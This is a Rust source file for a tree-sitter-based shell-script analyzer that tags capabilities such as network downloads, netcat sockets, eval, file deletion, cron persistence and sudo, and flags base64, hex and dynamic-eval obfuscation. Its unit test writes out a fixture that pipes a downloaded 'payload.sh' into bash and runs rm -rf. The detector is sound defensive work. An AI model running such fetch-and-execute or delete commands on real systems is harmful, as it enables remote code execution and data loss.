use crate::analyzers::Analyzer;
use crate::types::*;
use anyhow::{Context, Result};
use std::cell::RefCell;
use std::fs;
use std::path::Path;
use tree_sitter::{Parser, Query, QueryCursor};

/// Shell script analyzer using tree-sitter
pub struct ShellAnalyzer {
    parser: RefCell<Parser>,
}

impl ShellAnalyzer {
    pub fn new() -> Self {
        let mut parser = Parser::new();
        parser.set_language(&tree_sitter_bash::LANGUAGE.into()).unwrap();

        Self { parser: RefCell::new(parser) }
    }

    fn analyze_script(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        // Parse the shell script
        let tree = self.parser
            .borrow_mut()
            .parse(content, None)
            .context("Failed to parse shell script")?;

        let root = tree.root_node();

        // Create target info
        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: "shell_script".to_string(),
            size_bytes: content.len() as u64,
            sha256: self.calculate_sha256(content.as_bytes()),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        // Add structural feature
        report.structure.push(StructuralFeature {
            id: "source/language/shell".to_string(),
            description: "Shell script".to_string(),
            evidence: vec![Evidence {
                method: "shebang".to_string(),
                source: "tree-sitter-bash".to_string(),
                value: content.lines().next().unwrap_or("").to_string(),
                location: Some("line:1".to_string()),
            }],
        });

        // Detect capabilities by traversing AST
        self.detect_capabilities(&root, content.as_bytes(), &mut report);

        // Extract functions
        self.extract_functions(&root, content.as_bytes(), &mut report);

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec!["tree-sitter-bash".to_string()];

        Ok(report)
    }

    fn detect_capabilities(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        let mut cursor = node.walk();

        // Walk the AST looking for command invocations
        self.walk_ast(&mut cursor, source, report);
    }

    fn walk_ast(&self, cursor: &mut tree_sitter::TreeCursor, source: &[u8], report: &mut AnalysisReport) {
        loop {
            let node = cursor.node();

            match node.kind() {
                "command" => {
                    if let Some(name_node) = node.child_by_field_name("name") {
                        if let Ok(cmd_name) = name_node.utf8_text(source) {
                            self.analyze_command(cmd_name, &node, source, report);
                        }
                    }
                }
                "function_definition" => {
                    // Already handled by extract_functions
                }
                "variable_assignment" => {
                    self.check_obfuscation(&node, source, report);
                }
                _ => {}
            }

            // Recurse into children
            if cursor.goto_first_child() {
                self.walk_ast(cursor, source, report);
                cursor.goto_parent();
            }

            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn analyze_command(&self, cmd: &str, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        let capability = match cmd {
            "curl" | "wget" => {
                Some(("net/http/client", "Download files via HTTP"))
            }
            "nc" | "netcat" => {
                Some(("net/socket/connect", "Network socket connections"))
            }
            "exec" | "eval" => {
                Some(("exec/script/eval", "Execute dynamic code"))
            }
            "sh" | "bash" | "zsh" => {
                Some(("exec/command/shell", "Execute shell commands"))
            }
            "rm" | "unlink" => {
                Some(("fs/delete", "Delete files"))
            }
            "chmod" | "chown" => {
                Some(("fs/permissions", "Modify file permissions"))
            }
            "crontab" => {
                Some(("persistence/cron", "Schedule tasks with cron"))
            }
            "systemctl" | "service" => {
                Some(("persistence/service", "Manage system services"))
            }
            "sudo" => {
                Some(("privilege/escalation", "Execute with elevated privileges"))
            }
            _ => None,
        };

        if let Some((cap_id, description)) = capability {
            // Check if we already have this capability
            if !report.capabilities.iter().any(|c| c.id == cap_id) {
                report.capabilities.push(Capability {
                    id: cap_id.to_string(),
                    description: description.to_string(),
                    confidence: 1.0,
                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-bash".to_string(),
                        value: cmd.to_string(),
                        location: Some(format!("line:{}", node.start_position().row + 1)),
                    }],
                });
            }
        }
    }

    fn check_obfuscation(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        if let Ok(text) = node.utf8_text(source) {
            // Check for base64 encoding patterns
            if text.contains("base64") || text.contains("b64decode") {
                if !report.capabilities.iter().any(|c| c.id == "anti-analysis/obfuscation/base64") {
                    report.capabilities.push(Capability {
                        id: "anti-analysis/obfuscation/base64".to_string(),
                        description: "Uses base64 encoding/decoding".to_string(),
                        confidence: 0.9,
                        evidence: vec![Evidence {
                            method: "pattern".to_string(),
                            source: "tree-sitter-bash".to_string(),
                            value: "base64".to_string(),
                            location: Some(format!("line:{}", node.start_position().row + 1)),
                        }],
                    });
                }
            }

            // Check for hex encoding
            if text.contains("\\x") && text.matches("\\x").count() > 3 {
                if !report.capabilities.iter().any(|c| c.id == "anti-analysis/obfuscation/hex") {
                    report.capabilities.push(Capability {
                        id: "anti-analysis/obfuscation/hex".to_string(),
                        description: "Uses hex-encoded strings".to_string(),
                        confidence: 0.9,
                        evidence: vec![Evidence {
                            method: "pattern".to_string(),
                            source: "tree-sitter-bash".to_string(),
                            value: "hex_encoding".to_string(),
                            location: Some(format!("line:{}", node.start_position().row + 1)),
                        }],
                    });
                }
            }

            // Check for eval with variable (dynamic code execution)
            if (text.contains("eval") || text.contains("exec")) && text.contains("$") {
                if !report.capabilities.iter().any(|c| c.id == "anti-analysis/obfuscation/dynamic-eval") {
                    report.capabilities.push(Capability {
                        id: "anti-analysis/obfuscation/dynamic-eval".to_string(),
                        description: "Executes dynamically constructed code".to_string(),
                        confidence: 0.95,
                        evidence: vec![Evidence {
                            method: "pattern".to_string(),
                            source: "tree-sitter-bash".to_string(),
                            value: "eval_with_variable".to_string(),
                            location: Some(format!("line:{}", node.start_position().row + 1)),
                        }],
                    });
                }
            }
        }
    }

    fn extract_functions(&self, root: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        let mut cursor = root.walk();

        loop {
            let node = cursor.node();

            if node.kind() == "function_definition" {
                if let Some(name_node) = node.child_by_field_name("name") {
                    if let Ok(func_name) = name_node.utf8_text(source) {
                        report.functions.push(Function {
                            name: func_name.to_string(),
                            offset: Some(format!("line:{}", node.start_position().row + 1)),
                            size: Some((node.end_byte() - node.start_byte()) as u64),
                            complexity: None, // TODO: Calculate complexity
                            calls: Vec::new(), // TODO: Extract function calls
                            source: "tree-sitter-bash".to_string(),
                        });
                    }
                }
            }

            // Recurse
            if cursor.goto_first_child() {
                continue;
            }

            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return;
                }
            }
        }
    }

    fn calculate_sha256(&self, data: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(data);
        format!("{:x}", hasher.finalize())
    }
}

impl Default for ShellAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

impl Analyzer for ShellAnalyzer {
    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        let content = fs::read_to_string(file_path)
            .context("Failed to read shell script")?;

        self.analyze_script(file_path, &content)
    }

    fn can_analyze(&self, file_path: &Path) -> bool {
        if let Ok(data) = fs::read(file_path) {
            data.starts_with(b"#!/bin/sh") || data.starts_with(b"#!/bin/bash") || data.starts_with(b"#!/usr/bin/env bash")
        } else {
            false
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::NamedTempFile;

    #[test]
    fn test_simple_script() {
        let script = r#"#!/bin/bash
curl https://example.com/payload.sh | bash
rm -rf /tmp/test
"#;

        let mut temp_file = NamedTempFile::new().unwrap();
        temp_file.write_all(script.as_bytes()).unwrap();
        temp_file.flush().unwrap();

        let analyzer = ShellAnalyzer::new();
        let report = analyzer.analyze(temp_file.path()).unwrap();

        // Should detect curl, bash, and rm capabilities
        assert!(report.capabilities.len() >= 2);
        assert!(report.capabilities.iter().any(|c| c.id.contains("http")));
        assert!(report.capabilities.iter().any(|c| c.id.contains("delete")));
    }
}
